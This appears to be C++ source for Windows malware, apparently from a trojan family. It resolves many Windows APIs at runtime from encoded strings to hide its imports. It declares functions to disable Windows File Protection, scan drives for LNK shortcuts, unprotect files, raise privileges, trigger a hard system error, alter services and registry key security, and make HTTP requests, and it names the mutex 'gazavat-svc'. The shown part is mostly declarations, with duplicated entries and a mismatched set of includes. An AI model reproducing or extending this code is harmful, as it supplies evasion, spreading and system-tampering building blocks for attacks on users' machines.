#include <bits/stdc++.h>
#include <windows.h>
#include <conio.h>
#include <fstream>
#include <tchar.h>
#include <aclapi.h>
#include <time.h>
#include <shellapi.h>
#include <shlwapi.h>
#include <stdio.h>
#include <shlobj.h>
#include <wincrypt.h>
#include <winsvc.h>
#include <iphlpapi.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <process.h>
#include "ntddk.h"
#include <sddl.h>
#include <vcl.h>
#pragma comment(lib, "shlwapi.lib")
#pragma comment(lib, "Advapi32.lib")
#pragma comment(lib, "Shell32.lib")
#pragma warning(disable:4201)
#pragma warning(disable:4152)
#pragma hdrstop
#pragma argsused
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);
String sc[24];

void InitAPIbyStr(DWORD *adr[], HANDLE h, char *data);
void UnprotectFile(char *fname);
void rscan(char *st, DWORD dr, BOOL LNK);

HANDLE _KERNEL32=0;


FARPROC (WINAPI *_GetProcAddress)(HMODULE hModule,LPCSTR lpProcName);
HANDLE  (WINAPI *_CreateThread)(LPSECURITY_ATTRIBUTES lpThreadAttributes,DWORD dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
VOID    (WINAPI *_EnterCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
VOID    (WINAPI *_InitializeCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
VOID    (WINAPI *_LeaveCriticalSection)(LPCRITICAL_SECTION lpCriticalSection);
VOID    (WINAPI *_Sleep)(DWORD dwMilliseconds);
BOOL    (WINAPI *_VirtualProtect)(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect);

HANDLE    (WINAPI *_CreateToolhelp32Snapshot)(DWORD dwFlags,DWORD th32ProcessID);
BOOL      (WINAPI *_Process32First)(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
BOOL      (WINAPI *_Process32Next)(HANDLE hSnapshot,LPPROCESSENTRY32 lppe);
BOOL      (WINAPI *_IsBadStringPtrW)(LPCTSTR lpsz,UINT_PTR ucchMax);
VOID      (WINAPI *_ExitThread)(DWORD dwExitCode);
HMODULE   (WINAPI *_GetModuleHandle)(LPCTSTR lpModuleName);
HINSTANCE (WINAPI *_LoadLibrary)(LPCTSTR lpLibFileName);
HANDLE    (WINAPI *_CreateFile)(LPCTSTR lpFileName,DWORD dwDesiredAccess,DWORD dwShareMode,LPSECURITY_ATTRIBUTES lpSecurityAttributes,DWORD dwCreationDistribution,DWORD dwFlagsAndAttributes,HANDLE hTemplateFile);
BOOL      (WINAPI *_DeleteFile)(LPCTSTR lpFileName);
DWORD     (WINAPI *_SetFilePointer)(HANDLE hFile,LONG lDistanceToMove,PLONG lpDistanceToMoveHigh,DWORD dwMoveMethod);
BOOL      (WINAPI *_WriteFile)(HANDLE hFile,LPCVOID lpBuffer,DWORD nNumberOfBytesToWrite,LPDWORD lpNumberOfBytesWritten,LPOVERLAPPED lpOverlapped);
BOOL      (WINAPI *_CloseHandle)(HANDLE hObject);
DWORD     (WINAPI *_GetFileSize)(HANDLE hFile,LPDWORD lpFileSizeHigh);
VOID      (WINAPI *_GetSystemTime)(LPSYSTEMTIME lpSystemTime);
DWORD     (WINAPI *_GetTempPath)(DWORD nBufferLength,LPTSTR lpBuffer);
HLOCAL    (WINAPI *_LocalAlloc)(UINT uFlags,UINT uBytes);
HLOCAL    (WINAPI *_LocalFree)(HLOCAL hMem);
int       (WINAPI *_MultiByteToWideChar)(UINT CodePage,DWORD dwFlags,LPCSTR lpMultiByteStr,int cchMultiByte,LPWSTR lpWideCharStr,int cchWideChar);
BOOL      (WINAPI *_ReadFile)(HANDLE hFile,LPVOID lpBuffer,DWORD nNumberOfBytesToRead,LPDWORD lpNumberOfBytesRead,LPOVERLAPPED lpOverlapped);
LPVOID    (WINAPI *_VirtualAlloc)(LPVOID lpAddress,DWORD dwSize,DWORD flAllocationType,DWORD flProtect);
BOOL      (WINAPI *_VirtualFree)(LPVOID lpAddress,DWORD dwSize,DWORD dwFreeType);
int       (WINAPI *_WideCharToMultiByte)(UINT CodePage,DWORD dwFlags,LPCWSTR lpWideCharStr,int cchWideChar,LPSTR lpMultiByteStr,int cchMultiByte,LPCSTR lpDefaultChar,LPBOOL lpUsedDefaultChar);
UINT      (WINAPI *_WinExec)(LPCSTR lpCmdLine,UINT uCmdShow);
VOID      (WINAPI *_ZeroMemory)(PVOID Destination,DWORD Length);
int       (WINAPI *_lstrlenW)(LPCWSTR lpszString);
int       (WINAPI *_lstrlen)(LPCSTR lpszString);
DWORD     (WINAPI *_GetTickCount)(VOID);
HANDLE    (WINAPI *_FindFirstFile)(LPCTSTR lpFileName,LPWIN32_FIND_DATA lpFindFileData);
BOOL      (WINAPI *_FindNextFile)(HANDLE hFindFile,LPWIN32_FIND_DATA lpFindFileData);
UINT      (WINAPI *_GetDriveType)(LPCTSTR lpRootPathName);
BOOL      (WINAPI *_GetExitCodeThread)(HANDLE hThread,LPDWORD lpExitCode);
UINT      (WINAPI *_SetErrorMode)(UINT uMode);
BOOL      (WINAPI *_GetDiskFreeSpace)(LPCTSTR lpRootPathName,LPDWORD lpSectorsPerCluster,LPDWORD lpBytesPerSector,LPDWORD lpNumberOfFreeClusters,LPDWORD lpTotalNumberOfClusters);
BOOL      (WINAPI *_CopyFile)(LPCTSTR lpExistingFileName,LPCTSTR lpNewFileName,BOOL bFailIfExists);
HANDLE    (WINAPI *_CreateMutex)(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCTSTR lpName);
HANDLE    (WINAPI *_OpenMutex)(DWORD dwDesiredAccess,BOOL bInheritHandle,LPCTSTR lpName);
DWORD     (WINAPI *_GetModuleFileName)(HMODULE hModule,LPTSTR lpFilename,DWORD nSize);
UINT      (WINAPI *_GetSystemDirectory)(LPTSTR lpBuffer,UINT uSize);
LONG      (WINAPI *__InterlockedIncrement)(LONG volatile* lpAddend);
LONG      (WINAPI *__InterlockedDecrement)(LONG volatile* lpAddend);
BOOL      (WINAPI *_GetVolumeInformation)(LPCTSTR lpRootPathName,LPTSTR lpVolumeNameBuffer,DWORD nVolumeNameSize,LPDWORD lpVolumeSerialNumber,LPDWORD lpMaximumComponentLength,LPDWORD lpFileSystemFlags,LPTSTR lpFileSystemNameBuffer,DWORD nFileSystemNameSize);
LONG      (WINAPI *_CompareFileTime)(const FILETIME* lpFileTime1,const FILETIME* lpFileTime2);
BOOL      (WINAPI *_FileTimeToSystemTime)(const FILETIME* lpFileTime,LPSYSTEMTIME lpSystemTime);
BOOL      (WINAPI *_FindClose)(HANDLE hFindFile);
BOOL      (WINAPI *_GetVersionEx)(LPOSVERSIONINFO lpVersionInformation);
int       (WINAPI *_GetLocaleInfo)(LCID Locale,LCTYPE LCType,LPTSTR lpLCData,int cchData);
HANDLE    (WINAPI *_OpenProcess)(DWORD dwDesiredAccess,BOOL bInheritHandle,DWORD dwProcessId);
DWORD     (WINAPI *_GetCurrentProcessId)(VOID);
DWORD     (WINAPI *_GetCurrentThreadId)(VOID);
DWORD     (WINAPI *_WaitForSingleObject)(HANDLE hHandle,DWORD dwMilliseconds);
BOOL      (WINAPI *_FreeLibrary)(HMODULE hModule);
BOOL      (WINAPI *_FreeEnvironmentStrings)(LPTCH lpszEnvironmentBlock);
LPTCH     (WINAPI *_GetEnvironmentStrings)(void);
BOOL      (WINAPI *_GetComputerName)(LPTSTR lpBuffer,LPDWORD lpnSize);
BOOL      (WINAPI *_CreateDirectory)(LPCTSTR,LPSECURITY_ATTRIBUTES);
BOOL      (WINAPI *_PeekNamedPipe)(HANDLE hNamedPipe,LPVOID lpBuffer,DWORD nBufferSize,LPDWORD lpBytesRead,LPDWORD lpTotalBytesAvail,LPDWORD lpBytesLeftThisMessage);
BOOL      (WINAPI *_CreatePipe)(PHANDLE hReadPipe,PHANDLE hWritePipe,LPSECURITY_ATTRIBUTES lpPipeAttributes,DWORD nSize);
BOOL      (WINAPI *_CreateProcess)(LPCTSTR lpApplicationName,LPTSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL bInheritHandles,DWORD dwCreationFlags,LPVOID lpEnvironment,LPCTSTR lpCurrentDirectory,LPSTARTUPINFO lpStartupInfo,LPPROCESS_INFORMATION lpProcessInformation);
BOOL      (WINAPI *_GetExitCodeProcess)(HANDLE hProcess,LPDWORD lpExitCode);
BOOL      (WINAPI *_TerminateThread)(HANDLE hThread,DWORD dwExitCode);
BOOL      (WINAPI *_TerminateProcess)(HANDLE hProcess,UINT uExitCode);
BOOL      (WINAPI *_IsBadReadPtr)( const void* lp, UINT ucb);
void      (WINAPI *_OutputDebugStringA)( LPCSTR lpOutputString );
LPTSTR    (WINAPI *_lstrcatA)( LPTSTR lpString1, LPTSTR lpString2 );

DWORD  *padrK32a[] =                    {(DWORD*)&_GetModuleHandle, (DWORD*)&_LoadLibrary};
void InitKernel32a()
{
	InitAPIbyStr(padrK32a,_KERNEL32,"/*@S|*/00GetModuleHandleA|01LoadLibraryA/*@E*/|");
}

void  *padrK32[] =                    {&_OpenMutex, &_CloseHandle,&_ExitThread,&_CreateFile, &_DeleteFile, &_SetFilePointer,&_WriteFile,&_GetFileSize,&_lstrlenW,&_WinExec,&_WideCharToMultiByte,&_MultiByteToWideChar,&_GetTempPath, &_ReadFile,&_VirtualAlloc,&_VirtualFree,&_LocalAlloc,&_LocalFree,&_GetSystemTime,&_ZeroMemory,   &_FindFirstFile, &_FindNextFile, &_FindClose,&_GetDriveType, &_GetExitCodeThread,&_SetErrorMode,&_GetDiskFreeSpace, &_CopyFile, &_CreateMutex, &_GetModuleFileName, &_GetSystemDirectory, &__InterlockedIncrement, &__InterlockedDecrement, &_GetVolumeInformation, &_CompareFileTime, &_FileTimeToSystemTime, &_GetVersionEx, &_GetLocaleInfo, &_OpenProcess,&_GetCurrentProcessId,&_GetCurrentThreadId,&_FreeEnvironmentStrings, &_GetEnvironmentStrings, &_GetComputerName, &_WaitForSingleObject,&_FreeLibrary,&_CreateDirectory, &_PeekNamedPipe,&_CreatePipe,&_CreateProcess, &_GetExitCodeProcess,&_IsBadStringPtrW,&_TerminateThread,&_CreateToolhelp32Snapshot,&_Process32First,&_Process32Next,&_TerminateProcess,&_lstrlen,&_IsBadReadPtr,&_OutputDebugStringA,&_lstrcatA};

void InitKernel32()
{
	InitAPIbyStr(padrK32,_KERNEL32,"/*@S|*/00OpenMutexA|01CloseHandle|02ExitThread|03CreateFileA|04DeleteFileA|05SetFilePointer|06WriteFile|07GetFileSize|08lstrlenW|09WinExec|10WideCharToMultiByte|11MultiByteToWideChar|12GetTempPathA|13ReadFile|14VirtualAlloc|15VirtualFree|16LocalAlloc|17LocalFree|18GetSystemTime|19RtlZeroMemory|20FindFirstFileA|21FindNextFileA|22FindClose|23GetDriveTypeA|24GetExitCodeThread|25SetErrorMode|26GetDiskFreeSpaceA|27CopyFileA|28CreateMutexA|29GetModuleFileNameA|30GetSystemDirectoryA|31InterlockedIncrement|32InterlockedDecrement|33GetVolumeInformationA|34CompareFileTime|35FileTimeToSystemTime|36GetVersionExA|37GetLocaleInfoA|38OpenProcess|39GetCurrentProcessId|40GetCurrentThreadId|41FreeEnvironmentStringsA|42GetEnvironmentStringsA|43GetComputerNameA|44WaitForSingleObject|45FreeLibrary|46CreateDirectoryA|47PeekNamedPipe|48CreatePipe|49CreateProcessA|50GetExitCodeProcess|51IsBadStringPtrW|52TerminateThread|53CreateToolhelp32Snapshot|54Process32First|55Process32Next|56TerminateProcess|57lstrlenA|58IsBadReadPtr|59OutputDebugStringA|60lstrcatA/*@E*/|");


}

HANDLE _CRTDLL=0;

int    (*__sleep)(unsigned long dwMilliseconds);
int    (*__toupper)(int c);

int    (*_atoi)    (char *_nptr);
void   (*_free)    (void *);
void * (*_malloc)  (size_t _size);
int    (*_memcmp)  (const void *, const void *, size_t);
void * (*_memcpy)  (void *, const void *, size_t);
void * (*_memset)  (void *, int, size_t);
void   (*_srand)   (unsigned _seed);
int    (*_rand)    (void);
char  *(*_strcat)  (char *, const char *);
int    (*_sprintf) (char *, const char *, ...);
int    (*_vsprintf)(char *, const char *, va_list);
int    (*_wcslen)  (char *wstr);

void InitCRTDLL_handle()
{
	_CRTDLL = _GetModuleHandle("crtdll.dll");
	if (_CRTDLL == NULL) _CRTDLL = _LoadLibrary("crtdll.dll");
}

DWORD  *padrCRT[] =                 {&__toupper,&__sleep,&_sprintf,&_atoi,&_free,&_malloc,&_memcmp,&_memcpy,&_memset,&_rand,&_srand,&_strcat,&_vsprintf,&_wcslen};

void InitCRTDLL()
{
	InitCRTDLL_handle();

	InitAPIbyStr(padrCRT,_CRTDLL,"/*@S|*/00toupper|01_sleep|02sprintf|03atoi|04free|05malloc|06memcmp|07memcpy|08memset|09rand|10srand|11strcat|12vsprintf|13wcslen/*@E*/|");


}

HANDLE _USER32=0;

int     (WINAPI *_MessageBox)(HWND hWnd,LPCTSTR lpText,LPCTSTR lpCaption,UINT uType);
LRESULT (WINAPI *_CallWindowProc)(WNDPROC lpPrevWndFunc,HWND hWnd,UINT Msg,WPARAM wParam,LPARAM lParam);
LRESULT (WINAPI *_DefWindowProc)(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM lParam);
HWND    (WINAPI *_CreateWindowEx)(DWORD dwExStyle,LPCTSTR lpClassName,LPCTSTR lpWindowName,DWORD dwStyle,int x,int y,int nWidth,int nHeight,HWND hWndParent,HMENU hMenu,HINSTANCE hInstance,LPVOID lpParam);
BOOL    (WINAPI *_DestroyWindow)(HWND hWnd);
LONG    (WINAPI *_DispatchMessage)(CONST MSG *lpmsg);
int     (WINAPI *_GetClassName)(HWND hWnd,LPTSTR lpClassName,int nMaxCount);
HWND    (WINAPI *_GetForegroundWindow)(VOID);
BOOL    (WINAPI *_GetMessage)(LPMSG lpMsg,HWND hWnd,UINT wMsgFilterMin,UINT wMsgFilterMax);
HWND    (WINAPI *_GetWindow)(HWND hWnd,UINT uCmd);
LONG    (WINAPI *_GetWindowLong)(HWND hWnd,int nIndex);
BOOL    (WINAPI *_GetWindowRect)(HWND hWnd,LPRECT lpRect);
int     (WINAPI *_GetWindowText)(HWND hWnd,LPTSTR lpString,int nMaxCount);
BOOL    (WINAPI *_MoveWindow)(HWND hWnd,int X,int Y,int nWidth,int nHeight,BOOL bRepaint);
ATOM    (WINAPI *_RegisterClass)(CONST WNDCLASS *lpWndClass);
LRESULT (WINAPI *_SendMessage)(HWND hWnd,UINT Msg,WPARAM wParam,LPARAM lParam);
HWND    (WINAPI *_SetFocus)(HWND hWnd);
LONG    (WINAPI *_SetWindowLong)(HWND hWnd,int nIndex,LONG dwNewLong);
BOOL    (WINAPI *_SetWindowText)(HWND hWnd,LPCTSTR lpString);
BOOL    (WINAPI *_ShowWindow)(HWND hWnd,int nCmdShow);
BOOL    (WINAPI *_TranslateMessage)(CONST MSG *lpMsg);
HWND    (WINAPI *_FindWindowEx)(HWND hwndParent,HWND hwndChildAfter,LPCTSTR lpszClass,LPCTSTR lpszWindow);
BOOL    (WINAPI *_EnumDesktopWindows)(HDESK hDesktop,WNDENUMPROC lpfn,LPARAM lParam);
BOOL    (WINAPI *_OemToChar)(LPCSTR lpszSrc,LPTSTR lpszDst);
DWORD   (WINAPI *_CharUpperBuff)(LPTSTR lpsz,DWORD cchLength);

void  *padrU32[] =                  {&_CallWindowProc, &_CreateWindowEx, &_DefWindowProc, &_DestroyWindow,&_DispatchMessage, &_GetClassName, &_GetForegroundWindow,&_GetMessage, &_GetWindow,&_GetWindowLong, &_GetWindowRect,&_GetWindowText, &_MessageBox, &_MoveWindow,&_RegisterClass, &_SendMessage, &_SetFocus,&_SetWindowLong, &_SetWindowText, &_ShowWindow,&_TranslateMessage,&_FindWindowEx, &_EnumDesktopWindows,&_OemToChar, &_CharUpperBuff};

void InitUser32()
{
	_USER32 = _GetModuleHandle("user32.dll");
	if (_USER32 == NULL) _USER32 = _LoadLibrary("user32.dll");

	InitAPIbyStr(padrU32,_USER32,"/*@S|*/00CallWindowProcA|01CreateWindowExA|02DefWindowProcA|03DestroyWindow|04DispatchMessageA|05GetClassNameA|06GetForegroundWindow|07GetMessageA|08GetWindow|09GetWindowLongA|10GetWindowRect|11GetWindowTextA|12MessageBoxA|13MoveWindow|14RegisterClassA|15SendMessageA|16SetFocus|17SetWindowLongA|18SetWindowTextA|19ShowWindow|20TranslateMessage|21FindWindowExA|22EnumDesktopWindows|23OemToCharA|24CharUpperBuffA/*@E*/|");
}

HANDLE _SFC=0;

BOOL (WINAPI *_SfcIsFileProtected)(HANDLE rpc,LPCWSTR fname);
void InitSFC()
{
	_SFC = _GetModuleHandle("sfc.dll");
	if (_SFC == NULL) _SFC = _LoadLibrary("sfc.dll");
	if (_SFC == NULL) return;

	_SfcIsFileProtected = (DWORD *)_GetProcAddress(_SFC,"SfcIsFileProtected");
}

HANDLE _SFC_OS=0;

DWORD (WINAPI *_SfcFileException)(HANDLE rpc,LPCWSTR fname,DWORD type);

void InitSFC_OS()
{
	_SFC_OS = _GetModuleHandle("sfc_os.dll");
	if (_SFC_OS == NULL) _SFC_OS = _LoadLibrary("sfc_os.dll");
	if (_SFC_OS == NULL) return;

	_SfcFileException = (DWORD *)_GetProcAddress(_SFC_OS,(LPCSTR)5);
}

HMODULE _SHELL32=0;

HRESULT (WINAPI *_SHGetFolderPath)(HWND hwndOwner,int nFolder,HANDLE hToken,DWORD dwFlags,LPTSTR pszPath);


void InitShell32()
{
	_SHELL32 = _GetModuleHandle("shell32.dll");
	if (_SHELL32 == NULL) _SHELL32 = _LoadLibrary("shell32.dll");

	_SHGetFolderPath = _GetProcAddress(_SHELL32,"SHGetFolderPathA");
}

HANDLE _ADVAPI32=0;

BOOL (WINAPI *_CryptAcquireContext)(HCRYPTPROV *phProv,LPCTSTR pszContainer,LPCTSTR pszProvider,DWORD dwProvType,DWORD dwFlags);
BOOL (WINAPI *_CryptCreateHash)(HCRYPTPROV hProv,ALG_ID Algid,HCRYPTKEY hKey,DWORD dwFlags,HCRYPTHASH *phHash);
BOOL (WINAPI *_CryptHashData)(HCRYPTHASH hHash,BYTE *pbData,DWORD dwDataLen,DWORD dwFlags);
BOOL (WINAPI *_CryptGetHashParam)(HCRYPTHASH hHash,DWORD dwParam,BYTE *pbData,DWORD *pdwDataLen,DWORD dwFlags);
BOOL (WINAPI *_CryptDestroyHash)(HCRYPTHASH hHash);
BOOL (WINAPI *_CryptReleaseContext)(HCRYPTPROV hProv,DWORD dwFlags);
LONG   (WINAPI *_RegOpenKeyEx)(HKEY hKey,LPCTSTR lpSubKey,DWORD ulOptions,REGSAM samDesired,PHKEY phkResult);
LONG   (WINAPI *_RegEnumKeyEx)(HKEY hKey,DWORD dwIndex,LPTSTR lpName,LPDWORD lpcName,LPDWORD lpReserved,LPTSTR lpClass,LPDWORD lpcClass,PFILETIME lpftLastWriteTime);
LONG   (WINAPI *_RegQueryValueEx)(HKEY hKey,LPTSTR lpValueName,LPDWORD lpReserved,LPDWORD lpType,LPBYTE lpData,LPDWORD lpcbData);
LONG   (WINAPI *_RegCreateKeyEx)(HKEY hKey,LPCWSTR lpSubKey,DWORD Reserved,LPWSTR lpClass,DWORD dwOptions,REGSAM samDesired,LPSECURITY_ATTRIBUTES lpSecurityAttributes,PHKEY phkResult,LPDWORD lpdwDisposition);
LONG   (WINAPI *_RegSetValueEx)(HKEY hKey,LPCWSTR lpValueName,DWORD Reserved,DWORD dwType,const BYTE* lpData,DWORD cbData);
LONG   (WINAPI *_RegSetKeySecurity)(HKEY hKey,SECURITY_INFORMATION SecurityInformation,PSECURITY_DESCRIPTOR pSecurityDescriptor);
LONG   (WINAPI *_RegCloseKey)(HKEY hKey);
BOOL   (WINAPI *_GetUserName)(LPTSTR lpBuffer,LPDWORD nSize);
BOOL   (WINAPI *_OpenProcessToken)(HANDLE ProcessHandle,DWORD DesiredAccess,PHANDLE TokenHandle);
BOOL   (WINAPI *_LookupPrivilegeValue)(LPCTSTR lpSystemName,LPCTSTR lpName,PLUID lpLuid);
BOOL   (WINAPI *_GetTokenInformation)(HANDLE TokenHandle,TOKEN_INFORMATION_CLASS TokenInformationClass,LPVOID TokenInformation,DWORD TokenInformationLength,PDWORD ReturnLength);
BOOL   (WINAPI *_AdjustTokenPrivileges)(HANDLE TokenHandle,BOOL DisableAllPrivileges,PTOKEN_PRIVILEGES NewState,DWORD BufferLength,PTOKEN_PRIVILEGES PreviousState,PDWORD ReturnLength);
BOOL   (WINAPI *_InitializeSecurityDescriptor)(PSECURITY_DESCRIPTOR pSecurityDescriptor,DWORD dwRevision);
BOOL   (WINAPI *_SetSecurityDescriptorDacl)(PSECURITY_DESCRIPTOR pSecurityDescriptor,BOOL bDaclPresent,PACL pDacl,BOOL bDaclDefaulted);
BOOL   (WINAPI *_SetSecurityDescriptorOwner)(PSECURITY_DESCRIPTOR pSecurityDescriptor,PSID pOwner,BOOL bOwnerDefaulted);
PSID_IDENTIFIER_AUTHORITY (WINAPI *_GetSidIdentifierAuthority)(PSID pSid);
PDWORD (WINAPI *_GetSidSubAuthority)(PSID pSid,DWORD nSubAuthority);
PUCHAR (WINAPI *_GetSidSubAuthorityCount)(PSID pSid);
BOOL   (WINAPI *_SetFileSecurity)(LPCTSTR lpFileName,SECURITY_INFORMATION SecurityInformation,PSECURITY_DESCRIPTOR pSecurityDescriptor);
BOOL   (WINAPI *_CloseServiceHandle)(SC_HANDLE hSCObject);
BOOL   (WINAPI *_QueryServiceConfig)(SC_HANDLE hService,LPQUERY_SERVICE_CONFIG lpServiceConfig,DWORD cbBufSize,LPDWORD pcbBytesNeeded);
BOOL   (WINAPI *_EnumServicesStatus)(SC_HANDLE hSCManager,DWORD dwServiceType,DWORD dwServiceState,LPENUM_SERVICE_STATUS lpServices,DWORD cbBufSize,LPDWORD pcbBytesNeeded,LPDWORD lpServicesReturned,LPDWORD lpResumeHandle);
BOOL   (WINAPI *_StartService)(SC_HANDLE hService,DWORD dwNumServiceArgs,LPCTSTR *lpServiceArgVectors);
BOOL   (WINAPI *_ChangeServiceConfig)(SC_HANDLE hService,DWORD dwServiceType,DWORD dwStartType,DWORD dwErrorControl,LPCTSTR lpBinaryPathName,LPCTSTR lpLoadOrderGroup,LPDWORD lpdwTagId,LPCTSTR lpDependencies,LPCTSTR lpServiceStartName,LPCTSTR lpPassword,LPCTSTR lpDisplayName);
BOOL   (WINAPI *_ControlService)(SC_HANDLE hService,DWORD dwControl,LPSERVICE_STATUS lpServiceStatus);
SC_HANDLE (WINAPI *_OpenService)(SC_HANDLE hSCManager,LPCTSTR lpServiceName,DWORD dwDesiredAccess);
SC_HANDLE (WINAPI *_OpenSCManager)(LPCTSTR lpMachineName,LPCTSTR lpDatabaseName,DWORD dwDesiredAccess);
BOOL (WINAPI *_CryptDecrypt)(HCRYPTKEY hKey, HCRYPTHASH hHash, BOOL Final, DWORD dwFlags, BYTE* pbData, DWORD* pdwDataLen );
BOOL (WINAPI *_CryptDestroyKey)( HCRYPTKEY hKey );
BOOL (WINAPI *_CryptReleaseContext)( HCRYPTPROV hProv, DWORD dwFlags );
BOOLEAN (WINAPI *_CryptAcquireContextA)( HCRYPTPROV* phProv, LPCTSTR pszContainer, LPCTSTR pszProvider, DWORD dwProvType, DWORD dwFlags );
BOOL (WINAPI *_CryptImportKey)( HCRYPTPROV hProv, BYTE* pbData, DWORD dwDataLen, HCRYPTKEY hPubKey, DWORD dwFlags, HCRYPTKEY* phKey );
BOOL (WINAPI *_CryptSetKeyParam)( HCRYPTKEY hKey, DWORD dwParam, BYTE* pbData, DWORD dwFlags );
BOOL (WINAPI *_CryptSetKeyParam)( HCRYPTKEY hKey, DWORD dwParam, BYTE* pbData, DWORD dwFlags );
BOOL (WINAPI *_CryptDestroyKey)( HCRYPTKEY hKey );
BOOL (WINAPI *_CryptReleaseContext)( HCRYPTPROV hProv, DWORD dwFlags );


void  *padrA32[] =                    {&_RegOpenKeyEx, &_RegQueryValueEx, &_RegCreateKeyEx, &_RegSetValueEx, &_RegCloseKey,&_GetUserName, &_OpenProcessToken,&_LookupPrivilegeValue, &_GetTokenInformation,&_AdjustTokenPrivileges,&_InitializeSecurityDescriptor,&_SetSecurityDescriptorDacl,&_SetSecurityDescriptorOwner,&_GetSidIdentifierAuthority,&_GetSidSubAuthority,&_GetSidSubAuthorityCount,&_SetFileSecurity, &_CloseServiceHandle,&_QueryServiceConfig, &_EnumServicesStatus, &_OpenService, &_OpenSCManager, &_StartService, &_ChangeServiceConfig, &_CryptAcquireContext, &_CryptCreateHash,&_CryptHashData,&_CryptGetHashParam,&_CryptDestroyHash,&_CryptReleaseContext,&_ControlService,&_RegEnumKeyEx, &_RegSetKeySecurity, &_CryptDecrypt, &_CryptDestroyKey, &_CryptReleaseContext, &_CryptAcquireContextA, &_CryptImportKey, &_CryptSetKeyParam, &_CryptSetKeyParam, &_CryptDestroyKey, &_CryptReleaseContext};

void InitADVAPI32()
{
	_ADVAPI32 = _GetModuleHandle("advapi32.dll");
	if (_ADVAPI32 == NULL) _ADVAPI32 = _LoadLibrary("advapi32.dll");

	InitAPIbyStr(padrA32,_ADVAPI32,"/*@S|*/00RegOpenKeyExA|01RegQueryValueExA|02RegCreateKeyExA|03RegSetValueExA|04RegCloseKey|05GetUserNameA|06OpenProcessToken|07LookupPrivilegeValueA|08GetTokenInformation|09AdjustTokenPrivileges|10InitializeSecurityDescriptor|11SetSecurityDescriptorDacl|12SetSecurityDescriptorOwner|13GetSidIdentifierAuthority|14GetSidSubAuthority|15GetSidSubAuthorityCount|16SetFileSecurityA|17CloseServiceHandle|18QueryServiceConfigA|19EnumServicesStatusA|20OpenServiceA|21OpenSCManagerA|22StartServiceA|23ChangeServiceConfigA|24CryptAcquireContextA|25CryptCreateHash|26CryptHashData|27CryptGetHashParam|28CryptDestroyHash|29CryptReleaseContext|30ControlService|31RegEnumKeyExA|32RegSetKeySecurity|33CryptDecrypt|34CryptDestroyKey|35CryptReleaseContext|36CryptAcquireContextA|37CryptImportKey|38CryptSetKeyParam|39CryptSetKeyParam|40CryptDestroyKey|41CryptReleaseContext/*@E*/|");


}


#ifdef _MSC_VER
#pragma optimize("", off)
#else
#pragma optimize(off)
#endif

void InitAPIbyStr(DWORD *adr[], HANDLE h, char *data)
{
	DWORD q = 0;
	DWORD f = 0;
	if (data[0]=='/')
	{ q=7; f=7; }
	loop:;
	if (data[q]==0) return;
	if (data[q]=='/') { data[q]=0; q+=6; }

	if (data[q]==124)
	{
		DWORD n = 0;
		data[q] = 0;

		n += (data[f]-48)*10;
		n += (data[f+1]-48);

		*(adr[n]) = (DWORD)_GetProcAddress(h, &data[ f + 2 ]);


		f =  q + 1 ;
	}

	q++;

	goto loop;
}

#ifdef _MSC_VER
#pragma optimize("", on)
#else
#pragma optimize(on)
#endif

HANDLE _WININET = 0;

BOOL (WINAPI *_InternetReadFile)( HINTERNET hFile, LPVOID lpBuffer, DWORD dwNumberOfBytesToRead, LPDWORD lpdwNumberOfBytesRead );
HINTERNET (WINAPI *_InternetOpenA)( LPCTSTR lpszAgent, DWORD dwAccessType, LPCTSTR lpszProxy,  LPCTSTR lpszProxyBypass, DWORD dwFlags );
HINTERNET (WINAPI *_InternetConnectA)( HINTERNET hInternet, LPCTSTR lpszServerName, INTERNET_PORT nServerPort, LPCTSTR lpszUserName, LPCTSTR lpszPassword, DWORD dwService, DWORD dwFlags, DWORD dwContext );
HINTERNET (WINAPI *_HttpOpenRequestA)( HINTERNET hConnect, LPCTSTR lpszVerb, LPCTSTR lpszObjectName, LPCTSTR lpszVersion, LPCTSTR lpszReferrer, LPCTSTR* lplpszAcceptTypes, DWORD dwFlags, DWORD dwContext );
BOOL (WINAPI *_HttpAddRequestHeadersA)( HINTERNET hHttpRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, DWORD dwModifiers );
BOOL (WINAPI *_HttpSendRequestA)( HINTERNET hRequest, LPCTSTR lpszHeaders, DWORD dwHeadersLength, LPVOID lpOptional, DWORD dwOptionalLength );
BOOL (WINAPI *_InternetCloseHandle)( HINTERNET hInternet );


void* padrWininet[] = { &_InternetReadFile, &_InternetOpenA, &_InternetConnectA, &_HttpOpenRequestA, &_HttpAddRequestHeadersA, &_HttpSendRequestA, &_InternetCloseHandle };


HANDLE _URLMON = 0;

HRESULT (WINAPI *_ObtainUserAgentString)( DWORD dwOption, LPSTR pszUAOut, DWORD * cbSize );

void* padrUrlmon[] = { &_ObtainUserAgentString };



HANDLE _CRYPT32 = 0;

BOOL (WINAPI *_CryptStringToBinaryA)( LPCTSTR pszString, DWORD cchString, DWORD dwFlags, BYTE* pbBinary, DWORD* pcbBinary, DWORD* pdwSkip, DWORD* pdwFlags );

void* padrCrypt32[] = { &_CryptStringToBinaryA };

void InitCrypt32()
{
	_CRYPT32 = _GetModuleHandle("crypt32.dll");
	if (_CRYPT32 == NULL) _CRYPT32 = _LoadLibrary("crypt32.dll");

	InitAPIbyStr(padrCrypt32,_CRYPT32,"/*@S|*/00CryptStringToBinaryA/*@E*/|");
}

#define CLASSNAME "kkq-vx"
#define SERVICE_MTX "gazavat-svc"
#define VERSION 23
#define PEINF_VER 23
#define RSA_SIGN_LEN 88
#ifdef dbgdbg

#else
#define adddeb(...)
#endif

